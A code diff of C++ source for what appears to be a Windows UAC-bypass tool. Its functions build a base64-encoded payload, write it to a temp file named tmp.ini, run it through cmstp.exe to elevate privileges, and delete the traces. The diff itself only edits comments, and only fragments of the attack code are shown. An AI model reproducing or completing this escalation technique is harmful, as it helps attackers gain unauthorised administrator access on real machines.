@@ -81,7 +81,7 @@ bool utils::createProcess(const std::string& szCommandLine) {
     return true;
 }
 
-// kill a process by it's name - very slightly modified by ferret
+// kill a process by it's name - slight changes by ferret, detailed in docs
 void utils::killByName(const std::string& processName) {
     const char* filename = processName.c_str();
     HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
@@ -121,7 +121,7 @@ std::string utils::randomString(size_t nLength) {
     return str;
 }
 
-// assembles the payload by decoding the b64 payload parts - slightly modified by ferret
+// assembles the payload by decoding the b64 payload parts - slight changes by ferret, detailed in docs
 std::string deploy::craftPayload(const std::string& szExecutablePath) {
     const std::string randName = utils::randomString(8);
 
@@ -147,7 +147,7 @@ std::string deploy::craftPayload(const std::string& szExecutablePath) {
     return payload;
 }
 
-// writes the payload to disk - slightly modified by ferret
+// writes the payload to disk - slight changes by ferret, detailed in docs
 void deploy::writePayload(const std::string& szExecutablePath) {
     std::filesystem::path iniLocation(std::filesystem::temp_directory_path());
     std::filesystem::path iniFile("tmp.ini");
@@ -175,7 +175,7 @@ void deploy::writePayload(const std::string& szExecutablePath) {
 }
 
 
-// runs the payload to elevate the privileges - slightly modified by ferret
+// runs the payload to elevate the privileges - slight changes by ferret, detailed in docs
 bool deploy::runPayload() {
     const std::string iniFileName = "tmp.ini";
     const std::string executableName = "cmstp.exe";
@@ -196,7 +196,7 @@ bool deploy::runPayload() {
     return true;
 }
 
-// cleans up the files left from the payload - slightly modified by ferret
+// cleans up the files left from the payload - slight changes by ferret, detailed in docs
 bool deploy::cleanup() {
     std::filesystem::path iniLocation(std::filesystem::temp_directory_path());
     std::filesystem::path iniFile("tmp.ini");
